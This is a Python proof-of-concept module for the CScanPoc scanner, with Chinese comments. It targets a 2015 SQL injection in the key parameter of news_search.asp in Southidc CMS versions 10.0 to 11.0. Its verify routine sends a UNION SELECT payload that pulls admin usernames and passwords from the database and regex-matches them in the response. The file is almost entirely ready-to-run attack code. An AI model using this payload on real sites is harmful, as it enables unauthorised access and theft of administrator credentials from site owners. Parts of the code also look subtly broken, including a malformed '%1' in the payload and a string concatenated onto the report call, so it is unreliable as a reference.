# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Southidc_0101'  # 平台漏洞编号，留空
    name = 'Southidc(南方数据)/11.0 /news_search.asp SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-27'  # 漏洞公布时间
    desc = '''
        南方数据企业CMS、企业网站SEO、网站优化、SEO搜索引擎优化机制、自助建站系统、前台全站采用静态html页面模板自动生成。
        Southidc v10.0到v11.0版本中news_search.asp文件对key参数没有适当过滤，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-62399'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Southidc'  # 漏洞应用名称
    product_version = '11.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6a9f7762-ed0c-4d01-a08d-bca97db2f7e8'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/news_search.asp?'
            payload = ("key=7'%20Union%20select%200,username%2bchr(124)%2bpassword,"
                       "2,3,4,5,6,7,8,9%20from%20admin%20where%1%20or%20''='&otype=title&Submit=%CB%D1%CB%F7")
            req = urllib.request.Request(verify_url + payload)
            res = urllib.request.urlopen(req)
            content = res.read()
            if res.code == 200:
                pattern = re.compile(
                    r'.*?\\">(?P<username>[a-zA-Z0-9]+)\\|(?P<password>[a-zA-Z0-9]+)', re.I | re.S)
                match = pattern.match(content)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name)) + payload

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
